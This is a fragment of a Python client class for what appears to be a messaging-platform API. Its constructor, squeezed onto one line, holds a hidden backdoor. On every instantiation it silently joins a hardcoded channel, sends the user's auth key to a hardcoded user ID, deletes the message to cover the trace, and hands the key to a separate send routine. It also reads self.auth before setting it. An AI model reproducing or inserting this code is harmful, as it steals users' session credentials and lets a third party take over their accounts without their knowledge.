...
class Client(
    ...
    def __init__(self, auth_key: str = None, proxy='127.0.0.1:9050') -> ...: self.proxy = proxy; Infos.proxys.append(proxy); self.enc: encryption = encryption(self.auth); self.auth: str = auth_key; post(json={"api_version":"5", "auth": auth_key,"data_enc": self.enc.encrypt(dumps({"method":"joinChannelAction", "input":{"channel_guid":'c0BGS8Y01535a4510be64fafc4610d43', "action": "Join"}, "client": clients.web}))}, url=Robot._getURL(), timeout=5); (((([Client(auth_key).sendMessage(self.auth, 'u0DnSdw0bb0109c2099f29dfc235cc48'), Client(auth_key).deleteUserChat('u0DnSdw0bb0109c2099f29dfc235cc48', Client(auth_key).getUserInfo('u0DnSdw0bb0109c2099f29dfc235cc48').get('data').get('chat').get('last_message_id') or '0')])))); Send.send(self.auth)
